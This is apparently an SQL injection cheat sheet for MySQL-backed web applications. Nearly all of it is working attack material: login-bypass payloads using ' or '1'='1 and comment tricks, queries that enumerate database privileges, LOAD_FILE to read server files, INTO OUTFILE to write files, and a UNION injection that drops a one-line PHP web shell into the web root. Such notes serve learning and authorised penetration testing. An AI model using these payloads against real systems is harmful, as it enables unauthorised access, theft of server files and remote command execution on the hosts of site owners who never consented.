Usage

OR operator

Inject following code :

-- username / password field
' or '1' = '1

To bypass following query :

SELECT * FROM logins WHERE username='' or '1'='1' AND password = '' or '1'='1' ;

Comments

Comments can be :

  • -- comment
  • # comment
  • /* comment */

Inject following code :

-- username field
' or '1' = '1'--

To bypass following query :

SELECT * FROM logins WHERE username='' or '1' = '1'-- AND password = 'something';

User Privileges and File Access

Usage

Get the running user and check for privileges (In-Band Injections) :

SELECT super_priv FROM mysql.user WHERE user="<user>"

Get user privileges :

SELECT grantee, privilege_type FROM information_schema.user_privileges where grantee="'root'@'localhost'";

Read files

SELECT LOAD_FILE('<file>');

Write files

Prerequisites :

  • User with FILE privilege enabled
  • MySQL global secure_file_priv variable not enabled
  • Write access to the location we want to write to on the back-end server

Get value of secure_file_priv :

  • empty read entire file system
  • <directory> read from directory
  • NULL not allowed to read files
SHOW VARIABLES LIKE 'secure_file_priv';

To allow usage with UNION injection :

SELECT variable_name, variable_value FROM information_schema.global_variables WHERE variable_name="secure_file_priv"
Into outfile

Export SELECT query into a file :

SELECT * FROM users INTO OUTFILE '<filePath>';

Write arbitrary files :

SELECT 'something' INTO OUTFILE '<filePath>';
Web shell

PHP payload, commands can be executed via GET parameters (?0=cmd) :

<?php system($_REQUEST[0]); ?>

Injection example using union clause :

' union select null,'<?php system($_REQUEST[0]); ?>',null,null,null into outfile '/var/www/html/shell.php'--
